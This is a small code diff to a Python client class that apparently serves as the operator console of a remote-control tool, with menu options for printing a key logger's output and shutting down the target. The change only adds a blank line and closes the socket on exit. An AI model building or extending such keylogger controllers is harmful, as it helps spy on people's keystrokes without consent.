@@ -67,6 +67,7 @@ class Client:
       9: Print key logger
       10: Shutdown
       0: Exit''')
+      
       cmd = input('Enter command: ')
       try:
         if cmd == '1':
@@ -95,6 +96,7 @@ class Client:
           break
         elif cmd == '0':
           print("[EXIT] Exiting...")
+          self.socket.close()
           break
       except ConnectionResetError:
         print("[ERROR] Connection reset")
